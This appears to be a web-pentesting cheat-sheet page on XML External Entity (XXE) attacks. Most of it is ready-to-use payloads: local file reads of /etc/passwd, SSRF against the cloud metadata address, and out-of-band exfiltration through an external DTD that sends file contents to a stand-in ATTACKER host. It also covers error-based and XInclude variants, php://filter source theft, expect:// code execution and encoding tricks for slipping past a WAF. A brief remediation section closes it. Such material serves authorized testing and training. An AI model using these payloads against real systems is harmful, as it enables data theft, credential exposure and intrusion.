---
tags:
  - Web
---

# :material-xml: XML External Entity (XXE)

<span class="pill pill-hard">file read + SSRF</span> <span class="pill pill-info">web</span>

If the server parses XML with external entities enabled, you can read local files, hit internal services, and sometimes reach RCE.

!!! abstract "TL;DR"
    Anywhere XML is accepted (SOAP, SAML, SVG, DOCX, `Content-Type: application/xml`), declare a `DOCTYPE` with an external entity and reference it in a value that gets reflected.

## :material-file-eye: Classic file read

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<root><name>&x;</name></root>
```

The parser inlines the file into `&x;`, which the app echoes back.

## :material-server-network: SSRF via XXE

```xml
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">
```

Reach cloud metadata and internal hosts — see [SSRF](ssrf.md).

## :material-eye-off: Blind / OOB exfiltration

No reflection? Exfil via an external DTD you host:

```xml
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://ATTACKER/evil.dtd"> %ext; ]>
```

```dtd
<!-- evil.dtd -->
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % go "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?x=%f;'>">
%go; %send;
```

## :material-file-image: XXE via SVG / Office

Upload an `.svg` or a crafted `.docx` (it's a zip of XML) with the same `DOCTYPE` — image thumbnailers and document converters parse it server-side.

!!! opsec "OOB leaves DNS/HTTP trails"
    Blind XXE beacons to your host — use a domain you control and expect it in the target's egress logs.

## :material-alert-decagram: Edge cases & gotchas

=== "Error-based exfil"

    No output *and* no outbound network? Force the file contents into a **parse
    error** message. The external DTD you host:

    ```dtd
    <!ENTITY % f SYSTEM "file:///etc/passwd">
    <!ENTITY % go "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%f;'>">
    %go; %e;
    ```

    The parser tries to open `/nonexistent/<contents-of-passwd>` and prints the
    path — with the file inlined — in the error. Only works when errors are
    reflected to you.

=== "XInclude (no DOCTYPE control)"

    If the app embeds *your* XML into a larger document, you can't declare a
    `DOCTYPE` — but `XInclude` needs only a single element:

    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
    ```

    Common on SOAP endpoints that wrap your input server-side.

=== "PHP wrappers"

    On PHP with `php://` enabled, base64-wrap so binary/`<`-heavy source
    survives the parser, and read app source:

    ```xml
    <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/index.php">
    ```

    `expect://id` can reach **RCE** if the `expect` extension is loaded (rare).

=== "SVG that renders"

    A single upload can hit XXE *and* stored XSS. Thumbnailers (ImageMagick,
    librsvg, headless Chromium) parse the SVG server-side:

    ```xml
    <svg xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/hostname"/>
    </svg>
    ```

!!! bug "Why your payload silently fails"
    - **Newlines & special chars** in the target file break the exfil URL. Read
      single-line files (`/etc/hostname`, `/proc/self/environ` is `\0`-delimited —
      wrap in a param entity, don't put it in a query string). For multi-line
      files use error-based or a `php://filter` base64 wrapper.
    - **You can't reference a parameter entity (`%x;`) inside the internal
      subset** in most parsers — that's why OOB payloads push the definition into
      an *external* DTD. General entities (`&x;`) are the opposite: fine in the
      body, not in declarations.
    - **`file:///path/` (trailing slash) on Java** lists the directory instead of
      erroring — handy for enumeration.
    - **Protocol support is language-specific:** Java historically supported
      `http/https/ftp/file/jar/netdoc`; PHP adds `php://`/`expect://`; .NET and
      libxml are stricter. `libxml >= 2.9` disables external entities by default,
      so modern PHP/Python often needs the parser to be explicitly mis-configured.
    - **`Content-Type` matters:** flip `application/json` → `application/xml` (or
      `text/xml`) and resend — many endpoints accept both and only the XML path is
      vulnerable.
    - **UTF-16/UTF-7 encoding** the whole body can slip a payload past a WAF that
      only greps ASCII `<!DOCTYPE`.

!!! warning "Billion Laughs — don't do it on prod"
    Nested entity expansion (`&lol9;`) is a memory-exhaustion DoS, not exfil. It
    can take the target down and is almost never in scope. Know it exists so you
    don't trigger it by accident.

## :material-shield-check: Remediation

- Disable DOCTYPE / external entities in the parser (`disallow-doctype-decl`, `FEATURE_SECURE_PROCESSING`).
- Prefer JSON; if XML is required, use a hardened, patched parser.

## :material-link-variant: Related

- Pivots into [SSRF](ssrf.md) and cloud [AWS](../cloud/aws.md) metadata theft.
- Often lands in [File Upload](file-upload.md) (SVG/DOCX) flows.
- Reference: [PortSwigger XXE](https://portswigger.net/web-security/xxe).
